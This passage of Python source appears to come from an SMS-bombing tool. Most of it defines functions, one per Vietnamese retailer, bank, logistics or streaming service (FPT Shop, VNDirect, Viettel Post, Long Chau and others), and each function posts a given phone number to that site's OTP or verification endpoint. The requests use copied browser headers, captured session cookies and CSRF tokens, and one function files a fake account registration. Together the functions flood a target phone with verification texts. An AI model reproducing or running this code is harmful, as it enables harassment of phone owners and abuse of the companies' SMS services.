        # 'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; CDPI_RETURN=New; CDPI_SESSION_ID=f3a5c6c7-2ef6-4d19-a792-5e3c0410677f; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
        "dnt": "1",
        "origin": "https://www.pnj.com.vn",
        "priority": "u=0, i",
        "referer": "https://www.pnj.com.vn/customer/login",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = {
        "_method": "POST",
        "_token": "0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU",
        "type": "zns",
        "phone": phone,
    }
    response = requests.post(
        "https://www.pnj.com.vn/customer/otp/request",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def fptshop(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "apptenantid": "E6770008-4AEA-4EE6-AEDE-691FD22F5C14",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "order-channel": "1",
        "origin": "https://fptshop.com.vn",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://fptshop.com.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }
    json_data = {
        "fromSys": "WEBKHICT",
        "otpType": "0",
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
        headers=headers,
        json=json_data,
    )
def bestex(phone):
    headers = {
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "Connection": "keep-alive",
        "Origin": "https://www.best-inc.vn",
        "Referer": "https://www.best-inc.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "accept": "application/json",
        "authorization": "null",
        "content-type": "application/json",
        "lang-type": "vi-VN",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "x-auth-type": "WEB",
        "x-lan": "VI",
        "x-nat": "vi-VN",
        "x-timezone-offset": "7",
    }
    params = {
        "code": "0d3f727eefa2b169990f646a9649c11c",
        "instanceId": "80dc5344-18e2-4436-bb57-6ab5f4407450",
        "validate": "d0efe1958f09de4e2de7508046ad935b",
    }
    json_data = {
        "phoneNumber": phone,
        "verificationCodeType": 1,
    }
    response = requests.post(
        "https://v9-cc.800best.com/uc/account/sendSignUpCode",
        params=params,
        headers=headers,
        json=json_data,
    )
def vndirect(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "Connection": "keep-alive",
        "Origin": "https://mydgo.vndirect.com.vn",
        "Referer": "https://mydgo.vndirect.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    params = {
        "template": "sms_otp_trading_vi",
        "send": phone,
        "type": "PHONE",
    }
    response = requests.get(
        "https://id.vndirect.com.vn/authentication/otp/", params=params, headers=headers
    )
def mocha(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        # 'Content-Length': '0',
        "Origin": "https://video.mocha.com.vn",
        "Referer": "https://video.mocha.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
    }
    params = {
        "msisdn": phone,
        "languageCode": "vi",
    }
    response = requests.post(
        "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
        params=params,
        headers=headers,
    )
def vuihoc(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "ja",
        "app-id": "2",
        "authorization": "Bearer",
        "content-type": "application/json",
        "origin": "https://vuihoc.vn",
        "priority": "u=1, i",
        "referer": "https://vuihoc.vn/",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "send-from": "WEB",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    json_data = {
        "mobile": phone,
        "agent_type": "web",
        "app_id": 2,
        "type": 0,
    }
    response = requests.post(
        "https://api.vuihoc.vn/api/v2.1/send-otp", headers=headers, json=json_data
    )
def hasaki(phone):
    url = f"https://hasaki.vn/ajax?api=user.verifyUserName&username={phone}"
    response = requests.get(url)
def hacom(phone):
    cookies = {
        "uID": "hFQNuXwYq4h7TLFFES03",
        "shopping_cart_store": "LQ==",
        "_gcl_au": "1.1.697415432.1734752723",
        "Visitor_Returning": "true",
        "fcb677da6e48f7e29e4e541120b3608f": "l39bidom4ui4tush3p08cqfu14",
        "__session:0.8691948246500558:": "https:",
        "pageviewCount": "1",
        "_ga_K06S0V95LK": "GS1.1.1736011220.4.0.1736011220.60.0.0",
        "_ga_Q7PRFGJ9ZY": "GS1.1.1736011221.4.0.1736011221.60.0.0",
        "_ga": "GA1.2.1911747517.1734752724",
        "_gid": "GA1.2.1452150217.1736011221",
        "_gat_UA-42369638-1": "1",
        "mp_sid": "1736011230665.9717",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        # 'cookie': 'uID=hFQNuXwYq4h7TLFFES03; shopping_cart_store=LQ==; _gcl_au=1.1.697415432.1734752723; Visitor_Returning=true; fcb677da6e48f7e29e4e541120b3608f=l39bidom4ui4tush3p08cqfu14; __session:0.8691948246500558:=https:; pageviewCount=1; _ga_K06S0V95LK=GS1.1.1736011220.4.0.1736011220.60.0.0; _ga_Q7PRFGJ9ZY=GS1.1.1736011221.4.0.1736011221.60.0.0; _ga=GA1.2.1911747517.1734752724; _gid=GA1.2.1452150217.1736011221; _gat_UA-42369638-1=1; mp_sid=1736011230665.9717',
        "origin": "https://hacom.vn",
        "priority": "u=1, i",
        "referer": "https://hacom.vn/",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "action": "user",
        "action_type": "send-mobile-login-code",
        "mobile": phone,
    }
    response = requests.post(
        "https://hacom.vn/ajax/post.php", cookies=cookies, headers=headers, data=data
    )
def guardian(phone):
    cookies = {
        "PHPSESSID": "o6aqfs4i0deobd4mfunl1kas95",
        "_ga": "GA1.1.190473342.1735551421",
        "form_key": "52jZPkqnDujOPC7d",
        "private_content_version": "c610d00037c507e90e16b34257fb7eb7",
        "form_key": "52jZPkqnDujOPC7d",
        "mage-banners-cache-storage": "{}",
        "mage-cache-storage": "{}",
        "mage-cache-storage-section-invalidation": "{}",
        "mage-cache-sessid": "true",
        "mage-messages": "",
        "recently_viewed_product": "{}",
        "recently_viewed_product_previous": "{}",
        "recently_compared_product": "{}",
        "recently_compared_product_previous": "{}",
        "product_data_storage": "{}",
        "_gcl_au": "1.1.154523389.1735551427",
        "magenest_cookie_popup": '{"view_page":2}',
        "_ga_KPB8TYEK1Z": "GS1.1.1735551421.1.1.1735551436.45.0.1837450890",
        "section_data_ids": "{%22customer%22:1735551432%2C%22compare-products%22:1735551432%2C%22last-ordered-items%22:1735551432%2C%22cart%22:1735551432%2C%22directory-data%22:1735551432%2C%22captcha%22:1735551432%2C%22wishlist%22:1735551432%2C%22instant-purchase%22:1735551432%2C%22loggedAsCustomer%22:1735551432%2C%22multiplewishlist%22:1735551432%2C%22persistent%22:1735551432%2C%22review%22:1735551432%2C%22ammessages%22:1735551432%2C%22amasty-storepickup-data%22:1734342432%2C%22magenest-fbpixel-atc%22:1735551435%2C%22magenest-fbpixel-subscribe%22:1735551432%2C%22google-tag-manager-product-info%22:1735551432%2C%22recently_viewed_product%22:1735551432%2C%22recently_compared_product%22:1735551432%2C%22product_data_storage%22:1735551432%2C%22paypal-billing-agreement%22:1735551432}",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        # 'cookie': 'PHPSESSID=o6aqfs4i0deobd4mfunl1kas95; _ga=GA1.1.190473342.1735551421; form_key=52jZPkqnDujOPC7d; private_content_version=c610d00037c507e90e16b34257fb7eb7; form_key=52jZPkqnDujOPC7d; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _gcl_au=1.1.154523389.1735551427; magenest_cookie_popup={"view_page":2}; _ga_KPB8TYEK1Z=GS1.1.1735551421.1.1.1735551436.45.0.1837450890; section_data_ids={%22customer%22:1735551432%2C%22compare-products%22:1735551432%2C%22last-ordered-items%22:1735551432%2C%22cart%22:1735551432%2C%22directory-data%22:1735551432%2C%22captcha%22:1735551432%2C%22wishlist%22:1735551432%2C%22instant-purchase%22:1735551432%2C%22loggedAsCustomer%22:1735551432%2C%22multiplewishlist%22:1735551432%2C%22persistent%22:1735551432%2C%22review%22:1735551432%2C%22ammessages%22:1735551432%2C%22amasty-storepickup-data%22:1734342432%2C%22magenest-fbpixel-atc%22:1735551435%2C%22magenest-fbpixel-subscribe%22:1735551432%2C%22google-tag-manager-product-info%22:1735551432%2C%22recently_viewed_product%22:1735551432%2C%22recently_compared_product%22:1735551432%2C%22product_data_storage%22:1735551432%2C%22paypal-billing-agreement%22:1735551432}',
        "origin": "https://www.guardian.com.vn",
        "priority": "u=1, i",
        "referer": "https://www.guardian.com.vn/customer/account/create/",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    json_data = {
        "telephone": phone,
    }
    response = requests.post(
        "https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def mytv(phone):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "Access-Control-Allow-Origin": "*",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Macaddress": "1efb928b-126c-6ede-9234-109156bec4fb",
        "Origin": "https://mytv.com.vn",
        "Referer": "https://mytv.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "device_model": "Browser",
        "device_type": 127,
        "email": "",
        "login_type": "1",
        "phone": phone,
        "type": "1",
    }
    response = requests.post(
        "https://apigw.mytv.vn/api/v1/authen-handle/sendOTP?&uuid=f394447f-547d-472e-94a8-430bbce07975",
        headers=headers,
        json=json_data,
    )
def vinwonder(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://booking.vinwonders.com",
        "priority": "u=1, i",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    json_data = {
        "channel": 10,
        "UserName": phone,
        "Type": 1,
        "OtpChannel": 1,
    }
    response = requests.post(
        "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
        headers=headers,
        json=json_data,
    )
def viettelpost(phone):
    cookies = {
        "_ga_9NGCREH08E": "GS1.1.1734084022.1.0.1734084022.60.0.0",
        "_ga_L7ZKY279LR": "GS1.1.1734084022.1.0.1734084022.0.0.0",
        "_gid": "GA1.2.1737507607.1734084022",
        "QUIZIZZ_WS_COOKIE": "id_192.168.12.139_15001",
        ".AspNetCore.Antiforgery.XvyenbqPRmk": "CfDJ8OtVNEXQq4RKhDKBePKLDC87N48Yr5uV4QDB1isr007Di5Qan-wEdyWDGKfd9JMfon9jwtvPVFBPxxHx5dlVIvO8CQw--VSjkMn1qnECkXzdNavuyWmTAUtzeAsP19Ip6Y_mY4vBSOjwouGf5GVRjXY",
        "_ga_7RZCEBC0S6": "GS1.1.1734084023.1.1.1734084068.0.0.0",
        "_ga": "GA1.1.1856726391.1734084022",
        "_ga_WN26X24M50": "GS1.1.1734084024.1.1.1734084069.0.0.0",
        "_ga_P86KBF64TN": "GS1.1.1734084025.1.1.1734084100.0.0.0",
    }
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        # 'Cookie': '_ga_9NGCREH08E=GS1.1.1734084022.1.0.1734084022.60.0.0; _ga_L7ZKY279LR=GS1.1.1734084022.1.0.1734084022.0.0.0; _gid=GA1.2.1737507607.1734084022; QUIZIZZ_WS_COOKIE=id_192.168.12.139_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8OtVNEXQq4RKhDKBePKLDC87N48Yr5uV4QDB1isr007Di5Qan-wEdyWDGKfd9JMfon9jwtvPVFBPxxHx5dlVIvO8CQw--VSjkMn1qnECkXzdNavuyWmTAUtzeAsP19Ip6Y_mY4vBSOjwouGf5GVRjXY; _ga_7RZCEBC0S6=GS1.1.1734084023.1.1.1734084068.0.0.0; _ga=GA1.1.1856726391.1734084022; _ga_WN26X24M50=GS1.1.1734084024.1.1.1734084069.0.0.0; _ga_P86KBF64TN=GS1.1.1734084025.1.1.1734084100.0.0.0',
        "Origin": "null",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "FormRegister.FullName": "Lý Thái Nguyên",
        "FormRegister.Phone": phone,
        "FormRegister.Password": "121212a",
        "FormRegister.ConfirmPassword": "121212a",
        "ReturnUrl": "/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=sx2mao8eyhaa3mnc8wef8",
        "ConfirmOtpType": "Register",
        "FormRegister.IsRegisterFromPhone": "true",
        "__RequestVerificationToken": "CfDJ8OtVNEXQq4RKhDKBePKLDC_MuddVuqfm8EL3gF6XlbcZVHbb1jVedzGtXNvKAyVb9O2DPUCs6gVQqR5SxFUuKXMsSNaDPOuG5H4svaPdAb4ehmDI3qbX50SrYCWhLugj5Ez68oGXwYnfXsSJU96ufoo",
    }
    response = requests.post(
        "https://id.viettelpost.vn/Account/SendOTPByPhone",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def vtsolution(phone):
    cookies = {
        "ASP.NET_SessionId": "vo5etyjajtiy4ib2faw3znee",
        "Abp.Localization.CultureName": "vi",
        "__RequestVerificationToken": "0hb73fa4s9Aj0qDa5IGId09GuYCWZeXlNPtoEDHulaAhBnPSRIdgFK06D_87fHUUQjHndL8HWX817jTdiIBxNrKG7J6qaN4rR2tkcJzKmNI1",
        "XSRF-TOKEN": "zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json; charset=UTF-8",
        # 'cookie': 'ASP.NET_SessionId=vo5etyjajtiy4ib2faw3znee; Abp.Localization.CultureName=vi; __RequestVerificationToken=0hb73fa4s9Aj0qDa5IGId09GuYCWZeXlNPtoEDHulaAhBnPSRIdgFK06D_87fHUUQjHndL8HWX817jTdiIBxNrKG7J6qaN4rR2tkcJzKmNI1; XSRF-TOKEN=zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1',
        "origin": "https://gpp.com.vn",
        "priority": "u=1, i",
        "referer": "https://gpp.com.vn/",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
        "x-xsrf-token": "zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1",
    }
    json_data = {
        "soDienThoai": phone,
    }
    response = requests.post(
        "https://gpp.com.vn/account/LayMaXacThucDangKyTaiKhoan",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def cellphones(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        "origin": "https://account.cellphones.com.vn",
        "priority": "u=1, i",
        "referer": "https://account.cellphones.com.vn/",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    }
    json_data = {
        "g-recaptcha-response": "",
        "phone": phone,
    }
    response = requests.post(
        "https://api.cellphones.com.vn/v3/otp/phone/lost-password",
        headers=headers,
        json=json_data,
    )
def longchau(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "access-control-allow-origin": "*",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "order-channel": "1",
        "origin": "https://nhathuoclongchau.com.vn",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://nhathuoclongchau.com.vn/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-channel": "EStore",
    }
    json_data = {
        "phoneNumber": phone,
        "otpType": 0,
        "fromSys": "WEBKHLC",
    }
    response = requests.post(
        "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
        headers=headers,
        json=json_data,
    )
def longchau1(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "access-control-allow-origin": "*",
        "content-type": "application/json",
        "dnt": "1",
        "order-channel": "1",
        "origin": "https://nhathuoclongchau.com.vn",
        "priority": "u=1, i",
        "referer": "https://nhathuoclongchau.com.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-channel": "EStore",
    }
    json_data = {
        "phoneNumber": phone,
        "otpType": 1,
        "fromSys": "WEBKHLC",
    }
    response = requests.post(
        "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
        headers=headers,
        json=json_data,
    )
def ghtk(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "apptype": "Web",
        "content-type": "application/json",
        "origin": "https://khachhang.giaohangtietkiem.vn",
        "priority": "u=1, i",
        "referer": "https://khachhang.giaohangtietkiem.vn/",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "uniqdevice": "aa1f8c6d-b2fa-4f39-ade7-67a2de761870",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    }
    json_data = {
        "phone": phone,
    }
    response = requests.post(
        "https://shop-gateway.ghtk.vn/shop/api/v1/auth/send-otp",
        headers=headers,
        json=json_data,
    )
def vuanem(phone):
    cookies = {
        "_gcl_au": "1.1.1128585024.1735574039",
        "_ga": "GA1.1.250368982.1735574040",
        "_omappvp": "VK1C6VoloRGZ6HXZ1TmqGaGfrlN1xwbsBbkTkpA3MibQWKzp1w9J3xjV537SsIPtBlHN8OIlwiMAim1aeS1gpLFa3ZTVXpaC",
        "_tt_enable_cookie": "1",
        "_ttp": "FOAk7BHWqv3mT4nj9RVG0guczge.tt.1",
        "USER_DATA": "%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2223c1d9a0-c444-498a-b273-de8f2f5d5674%22%2C%22deviceAdded%22%3Atrue%7D",
        "SOFT_ASK_STATUS": "%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D",
        "omSeen-yb0ikgooj8bthm1nt9fg": "1735574243012",
        "OPT_IN_SHOWN_TIME": "1735888837087",
        "_ga_DRHBMGWWEV": "GS1.1.1736348543.4.0.1736348543.60.0.977217226",
        "_uetsid": "919ed260cdd111ef9f0a4dbdae8f09e4",
        "_uetvid": "48c62b60c6c611ef99b8e5eb91fdf162",
        "_clck": "1olqljb%7C2%7Cfse%7C0%7C1825",
        "omSeen-xq4g8vc9ua0nvty8bmdi": "1736348546259",
        "_clsk": "17fwkno%7C1736348547417%7C1%7C1%7Ce.clarity.ms%2Fcollect",
        "moe_uuid": "23c1d9a0-c444-498a-b273-de8f2f5d5674",
        "SESSION": "%7B%22sessionKey%22%3A%2237bd3d0b-93ba-4a12-9258-1f826cb4916e%22%2C%22sessionStartTime%22%3A%222025-01-08T15%3A02%3A28.910Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1736350348956%2C%22numberOfSessions%22%3A8%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fvuanem.com%2F%3Futm_source%3Dcoccoc%26utm_medium%3Dcpc%26utm_campaign%3D1830508%26utm_term%3Dvuanem%26utm_content%3D44894959%26ctm_event_id%3D3239749836%22%2C%22source%22%3A%22coccoc%22%2C%22medium%22%3A%22cpc%22%2C%22term%22%3A%22vuanem%22%2C%22campaign_name%22%3A%221830508%22%2C%22content%22%3A%2244894959%22%7D%7D",
        "om-xq4g8vc9ua0nvty8bmdi": "1736348549226",
